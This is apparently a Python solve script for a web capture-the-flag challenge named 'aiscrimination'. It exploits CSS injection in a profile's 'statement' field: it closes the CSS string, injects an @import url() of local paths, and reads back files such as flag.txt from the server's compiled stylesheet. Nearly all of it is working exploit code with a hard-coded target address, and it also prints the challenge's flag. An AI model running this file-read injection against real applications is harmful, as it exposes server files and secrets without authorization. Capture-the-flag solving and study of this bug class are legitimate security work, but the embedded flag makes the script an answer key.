#!/usr/bin/env python3
"""
Solve script for aiscrimination (DefCamp CTF 2026 Quals)
Category: Web | Points: 355 | Difficulty: Medium

Vulnerability: Server-side CSS preprocessor @import URL file inclusion
The application compiles CSS for identity cards using a server-side preprocessor.
The 'statement' field is injected directly into CSS without sanitization.
By injecting @import url("/path/to/file"), the preprocessor includes local files
into the compiled CSS output, achieving arbitrary file read.

Flag: CTF{5bb9cb8b8ff43e243fe85fceaf646e7ba6a5c80250e96678be2aa71add38eb97}
"""
import requests
import time
import re
import base64
import json
import sys

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://34.159.240.152:31540"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Referer": f"{BASE}/",
}

s = requests.Session()
s.headers.update(HEADERS)


def create_profile(name, comment, statement):
    """Create a profile and return profile_id."""
    r = s.post(f"{BASE}/join", data={
        "display_name": name,
        "comment": comment,
        "statement": statement,
    }, allow_redirects=True)
    sess = s.cookies.get('session', '')
    if sess:
        parts = sess.split('.')
        padded = parts[0] + '=' * (4 - len(parts[0]) % 4)
        try:
            data = json.loads(base64.urlsafe_b64decode(padded))
            return data.get('profile_id')
        except:
            pass
    return None


def read_file_via_css_import(filepath):
    """Read a local file via CSS @import url() injection in the statement field."""
    # Payload: close the CSS content string and rule, inject @import, then re-open
    # The CSS template is:
    #   .identity-card::after { content: "<STATEMENT>"; ... }
    # We inject:
    #   x"; } @import url("<filepath>"); .x { content: "
    # Which produces:
    #   .identity-card::after { content: "x"; }
    #   @import url("<filepath>");
    #   .x { content: ""; ... }
    # The server-side CSS preprocessor resolves @import and embeds the file content
    # into the compiled CSS as:
    #   #card-<id> .imported-fragment::after { content: "<file_content>"; }
    
    statement = f'x"; }} @import url("{filepath}"); .x {{ content: "'
    pid = create_profile("solver", "automated solve", statement)
    time.sleep(2.0)
    
    if not pid:
        print("[-] Failed to create profile")
        return None
    
    r = s.get(f"{BASE}/assets/cards/{pid}/identity.css")
    if r.status_code != 200:
        print(f"[-] Failed to fetch CSS: {r.status_code}")
        return None
    
    # Extract file content from the imported-fragment::after { content: "..."; }
    m = re.search(
        r'\.imported-fragment::after\s*\{[^}]*content:\s*"([^"]*)"',
        r.text, re.DOTALL
    )
    if m:
        content = m.group(1)
        # CSS uses \A for newlines
        content = content.replace('\\A ', '\n').replace('\\A', '\n')
        return content.strip()
    
    return None


def main():
    print("[*] aiscrimination solver - CSS @import file inclusion")
    print(f"[*] Target: {BASE}")
    
    # Read the flag
    flag_paths = [
        "/home/ctf/flag.txt",
        "/flag.txt",
        "/flag",
        "/app/flag.txt",
    ]
    
    for path in flag_paths:
        print(f"[*] Trying to read: {path}")
        content = read_file_via_css_import(path)
        if content:
            print(f"[+] File read successful!")
            flag_match = re.search(r'CTF\{[^}]+\}', content)
            if flag_match:
                flag = flag_match.group(0)
                print(f"[+] FLAG: {flag}")
                return flag
            else:
                print(f"[*] Content (no flag pattern): {content[:200]}")
        time.sleep(2.0)
    
    print("[-] Flag not found in common locations")
    return None


if __name__ == "__main__":
    flag = main()
    if flag:
        with open("flag.txt", "w") as f:
            f.write(flag)
        print(f"\n[+] Flag saved to flag.txt")
